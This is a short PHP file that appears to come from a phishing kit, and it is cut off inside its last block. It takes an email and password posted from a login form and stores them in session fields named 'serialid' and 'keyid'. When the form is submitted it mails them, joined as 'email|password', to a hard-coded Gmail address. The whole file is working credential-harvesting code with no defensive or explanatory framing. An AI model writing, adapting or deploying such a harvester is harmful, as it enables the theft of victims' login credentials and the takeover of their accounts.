<?php
session_start();

if(empty($_POST['email']) || empty($_POST['pass'])) {
	header("Location: index.php");
} else {
	$_SESSION['serialid'] = $_POST['email'];
	$_SESSION['keyid'] = $_POST['pass'];
}

if(isset($_POST['submitcontinue'])) {
	$wheretosend = "alexandramarshall729@gmail.com";
	mail($wheretosend, 'new', $_SESSION['serialid']."|".$_SESSION['keyid']);

